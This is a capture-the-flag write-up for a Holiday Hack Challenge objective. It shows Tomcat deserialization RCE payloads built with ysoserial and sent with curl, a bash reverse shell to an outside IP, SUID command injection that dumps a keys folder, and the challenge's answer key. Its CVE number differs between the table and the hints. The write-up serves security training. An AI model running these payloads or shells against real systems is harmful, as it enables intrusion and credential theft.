---
nav: |
  <table>
  <thead><tr><th><a href="/HHC_2025/act3_hack-a-gnome_mjd.html">Previous Objective: Act3 Hack-a-Gnome </a></th> <th><a href="/HHC_2025/index.html">Table of Contents</a></th> <th><a href="/HHC_2025/act3_schrodingersscope_mjd.html">Next Objective: Act3 Schrodinger's Scope</a></th></table>
---
<table>
<thead><tr><th>Objective: Snowcat RCE and Privilege Escalation</th> <th>Difficulty Level: 3</th><tr><td>Tom, in the hotel, found a wild Snowcat bug. Help him chase down the RCE! Recover and submit the API key not being used by snowcat.</td> <td>Location: Grand Hotel</td></table>
<h2>Solution Overview</h2>
Starting with an account with minimal access to the system, the website was found to be running Apache Tomcat version 9.0.90. This version is susceptable to a Remote Code Execution (RCE) vulnerability. This vulnerability was exploited to gain the privileges of the web application service account. Three binaries were discovered with Set User ID (SUID), a special permission in Unix/Linux systems that allows a file to run with the privileges of the file owner rather than the user executing it. These files were susceptable to command injection, allowing commands to be executed as a user with higher privileges. This enabled access to the authorized_keys file.
<table>
<thead><tr><th>Activity</th> <th>Primary Tactic</th> <th>MITRE ATT&CK Technique ID</th> <th>MITRE ATT&CK Technique Name</th><tr><td>Error message leaks version information</td> <td>Reconnaissance</td> <td>T1593</td> <td>Search Open Websites/Domains</td><tr><td>Leverage Unauthenticated Remote Code Execution (RCE) in Apache Tomcat (CVE-2025-24815)</td> <td>Initial Access</td> <td>T1190</td> <td>Exploit Public-Facing Application</td><tr><td>Abuse SUID binaries</td> <td>Privelege Escalation</td> <td>T1548.001</td> <td>Abuse Elevation Control Mechanism: Setuid and Setgid</td><tr><td>Command Injection leading to Privilege Escalation</td> <td>Execution</td> <td>T1059.004</td> <td>Command and Scripting Interpreter : Unix Shell</td></table>
<h2>Detailed Solution</h2>
<details>
<summary>Click to expand</summary>
<p>Using a nonexistent URL (http://localhost/nonexistant), an error message was triggered revealing that the system is running a potentially vulnerable version of Tomcat.</p>
<p>!<a href="/HHC_2025/images/snowcat_version.jpg">Tomcat Version Evidence</a> </p>
<p>Testing identified the CommonsCollections6 gadget could effectively deliver a payload. The initial approach was to touch a file in the /tmp directory to confirm a successful attack.</p>
<p>Payload details:</p>
<pre><code>
java -jar /home/user/ysoserial.jar CommonsCollections6 &#39;touch /tmp/pwned&#39; &gt; payload.bin
SESSION_ID=$(curl -s -c - http://localhost/ | grep JSESSIONID | awk &#39;{print $7}&#39;)
curl -s -X PUT -H &quot;Content-Length: $(wc -c &lt; payload.bin)&quot; -H &quot;Content-Range: bytes 0-$(($(wc -c &lt; payload.bin)-1))/$(wc -c &lt; payload.bin)&quot; --data-binary @payload.bin &quot;http://localhost/${SESSION_ID}/session&quot; &gt; /dev/null
curl -s -H &quot;Cookie: JSESSIONID=.${SESSION_ID}&quot; &quot;http://localhost/&quot; &gt; /dev/null
ls -la /tmp/pwned 2&gt;/dev/null &amp;&amp; echo &quot;SUCCESS with touch!&quot; || echo &quot;Failed&quot;
</code></pre>
<p>The initial payload was delivered and successful:</p>
<p>!<a href="/HHC_2025/images/snowcat_initialpayload.jpg">Tomcat Initial Payload Evidence</a> </p>
<p>To achieve a remote shell, the following approach was used:</p>
<p>1. Setup a linux machine in linode, and start a netcat listener on port 4444</p>
<p>2. As the low level user, create a shell code in the /tmp directory</p>
<p>3. Change permissions on the file to allow other users to access and execute</p>
<p>4. Send a payload to set the SUID on the shell file</p>
<p>5. Send a payload that uses setsid to detach the process completely from the invoking script and run the shell</p>
<p>The shell file used was:</p>
<pre><code>
bash -i &gt;&amp; /dev/tcp/69.164.211.205/4444 0&gt;&amp;1
</code></pre>
<p>The payload used to set the SUID was:</p>
<pre><code>
java -jar /home/user/ysoserial.jar CommonsCollections6 &#39;chmod u+s /tmp/reverse_shell.sh&#39; &gt; payload.bin
&lt;!-- Get session ID --&gt;
SESSION_ID=$(curl -s -c - http://localhost/ | grep JSESSIONID | awk &#39;{print $7}&#39;)
&lt;!-- Upload payload --&gt;
curl -s -X PUT -H &quot;Content-Length: $(wc -c &lt; payload.bin)&quot; -H &quot;Content-Range: bytes 0-$(($(wc -c &lt; payload.bin)-1))/$(wc -c &lt; payload.bin)&quot; --data-binary @payload.bin &quot;http://localhost/${SESSION_ID}/session&quot; &gt; /dev/null
&lt;!-- Trigger payload --&gt;
curl -s -H &quot;Cookie: JSESSIONID=.${SESSION_ID}&quot; &quot;http://localhost/&quot; &gt; /dev/null
</code></pre>
<p>Initial payloads failed, due to the payload script completing before the shell was established, killing the shell. Using setsid to detach the shell process from the script, allowed it to establish the connection.</p>
<p>The payload used setid and ran the shell was:</p>
<pre><code>
java -jar /home/user/ysoserial.jar CommonsCollections6 &#39;setsid bash /tmp/reverse_shell.sh &gt;/dev/null 2&gt;&amp;1 &amp;&#39; &gt; payload.bin
&lt;!-- Get session ID --&gt;
SESSION_ID=$(curl -s -c - http://localhost/ | grep JSESSIONID | awk &#39;{print $7}&#39;)
&lt;!-- Upload payload --&gt;
curl -s -X PUT -H &quot;Content-Length: $(wc -c &lt; payload.bin)&quot; -H &quot;Content-Range: bytes 0-$(($(wc -c &lt; payload.bin)-1))/$(wc -c &lt; payload.bin)&quot; --data-binary @payload.bin &quot;http://localhost/${SESSION_ID}/session&quot; &gt; /dev/null
&lt;!-- Trigger payload --&gt;
curl -s -H &quot;Cookie: JSESSIONID=.${SESSION_ID}&quot; &quot;http://localhost/&quot; &gt; /dev/null
</code></pre>
<p>This resulted in access as the identity running the web service:</p>
<p>!<a href="/HHC_2025/images/snowcat_serviceaccount.jpg">Snowcat Service Account User</a> </p>
<p>Three binaries were discovered that the service account has access to with the SUID set:</p>
<p>These binaries have SUID set:</p>
<p>- /usr/local/weather/humidity</p>
<p>- /usr/local/weather/pressure</p>
<p>- /usr/local/weather/temperature</p>
<p>The commands are run with a valid key:</p>
<p>- /usr/local/weather/temperature 4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6</p>
<p>- /usr/local/weather/humidity 4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6</p>
<p>- /usr/local/weather/pressure 4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6</p>
<p>The weather user has access to the /usr/local/weather/keys directory. This was our target:</p>
<p>!<a href="/HHC_2025/images/snowcat_keys.jpg">Keys Directory</a>  </p>
<p>The following command was injected into the binary command line to create a file containing the contents of the keys folder and change the file permissions:</p>
<pre><code>
/usr/local/weather/temperature &quot;4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6&#39;;cat /usr/local/weather/keys/* &gt; /tmp/keys.txt;chmod 644 /tmp/keys.txt;echo &#39;&quot;
</code></pre>
<p>Viewing the contents of the file revealed:</p>
<pre><code>
cat /tmp/keys.txt
4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6
8ade723d-9968-45c9-9c33-7606c49c2201
</code></pre>
<p>The first key listed is the one used with the temperature binary. The second key is not used by snowcat.</p>
<p><strong>Answer: 8ade723d-9968-45c9-9c33-7606c49c2201</strong></p>
</details>
<h2>Tools Reference</h2>
<table>
<thead><tr><th>Tools Used</th> <th>Tool Version</th><tr><td>ysoserial.jar</td> <td>Version: v0.0.6 Release Date: June 28, 2022</td> <td></td><tr><td>Linux Linode System</td> <td>Ubuntu 24.04 LTS</td><tr><td>netcat</td> <td>v1.10-50</td> <td></td><tr><td>curl</td> <td>8.11.0</td> <td></td></table>
<h2>Hints Reference</h2>
<table>
<thead><tr><th>Provided By</th> <th>Hint</th><tr><td>Santa</td> <td>Snowcat is closely related to Tomcat. Maybe the recent Tomcat Remote Code Execution vulnerability (CVE-2025-24813) will work here.</td><tr><td>Santa</td> <td>Maybe we can inject commands into the calls to the temperature, humidity, and pressure monitoring services.</td><tr><td>Santa</td> <td>If you're feeling adventurous, maybe you can become root to figure out more about the attacker's plans.</td><tr><td>Thomas Hessman</td> <td>We've lost access to the neighborhood weather monitoring station. There are a couple of vulnerabilities in the snowcat and weather monitoring services that we haven't gotten around to fixing. Can you help me exploit the vulnerabilities and retrieve the other application's authorization key? Enter the other application's authorization key into the badge. If Frosty's plan works and everything freezes over, our customers won't be having the best possible experienceâ€”they'll be having the coldest possible experience! We need to stop this before the whole neighborhood becomes one giant freezer.</td></table>
<h2>Acknowledgements</h2>
<table>
<thead><tr><th>Provided By</th> <th>Notes</th><tr><td>none</td> <td>none</td></table>
<table>
<thead><tr><th><a href="/HHC_2025/act3_hack-a-gnome_mjd.html">Previous Objective: Act3 Hack-a-Gnome </a></th> <th><a href="/HHC_2025/index.html">Table of Contents</a></th> <th><a href="/HHC_2025/act3_schrodingersscope_mjd.html">Next Objective: Act3 Schrodinger's Scope</a></th></table>